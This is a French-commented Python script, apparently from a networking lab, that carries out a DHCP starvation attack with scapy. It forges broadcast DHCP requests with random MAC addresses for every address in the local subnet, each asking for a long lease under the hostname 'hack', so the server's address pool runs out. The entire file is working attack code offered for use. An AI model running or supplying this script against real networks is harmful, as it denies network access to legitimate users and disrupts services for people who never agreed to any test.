#!/usr/bin/python3
'''Code source pour l'attaque DHCP Starvation'''
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

#Variable dont nous avons besoin afin de spécifier l'interface au réseau duquel est envoyé les paquets
interface = "enxa0cec8f3e4df"

#Construction d'un paquet DHCP_DISCOVER à envoyer
#Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
#Construction de la couche L2 IP avec une adresse source par défaut et une adresse destination 255.255.255.255
frame_discover_l2 = IP(src="0.0.0.0", dst="255.255.255.255")
#Construction de la couche L3 UDP en spécifiant à quel port nous voulons que ce paquet soit envoyé, le port de destination est 67 et celui source est 68
frame_discover_l3 = UDP(dport=67,sport=68)
#Ajout de l'en-tête "BOOTP" afin de spécifier des options, "op=1" indique qu'il s'agit d'une demande de démarrage, de plus, l'adresse MAC du client se voit attribuer une adresse aléatoire
frame_discover_l4 = BOOTP(op=1, chaddr=RandMAC())

#Récuperation de l'IP de la carte réseau utilisé
ip = get_if_addr(interface)
#Séparation de tout les octets de l'IP et stockage dans une liste
liste = ip.split(".")
#Suppression du dernier octet de l'IP
liste.pop(3)
ip_str = ""
#Pour chaque tour de boucle nous supprimons les points afin d'obtenir une IP sans "."
for i in range(len(liste)):
    if(i!=0):
        ip_str = (ip_str + "." + liste[i])
    else:
        ip_str = (ip_str+ liste[i])
#À chaque tour de boucle nous ajoutons "1" au dernier octet de l'IP puis nous reconstruisons l'IP avec les "." à partir de la liste
for j in range(0,256):
    liste = ip.split(".")
    liste.pop(3)
    str_vide = ""
    new = ip_str+str_vide+ "."+str(j)
    print("Attaque en cours sur l'ip "+new)
#Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
    frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
#Création du message DHCP avec un type de message "request", ainsi qu'un "lease time" correspondant au temps où l'IP ne peut pas être redistribuée, ici, à 100 000 secondes
    frame_discover_l5 = DHCP(options=[("message-type","request"),("requested_addr",new),("hostname","hack"),("lease_time",100000),"end"])
#Encapsulation des différentes couches afin d'obtenir un paquet
    frame_discover = frame_discover_l1 / frame_discover_l2 / frame_discover_l3 / frame_discover_l4 / frame_discover_l5
#Envoie du segment grâce à la fonction "sendp", le DHCP fonctionnant sur la couche L2 du modèle OSI
#Envoie du paquet à l'intérieur d'une boucle "loop=1" afin d'effectuer plusieurs interrogations demandant les adresses IP
    sendp(frame_discover, iface=interface,loop=0,verbose=0)
    time.sleep(0.4)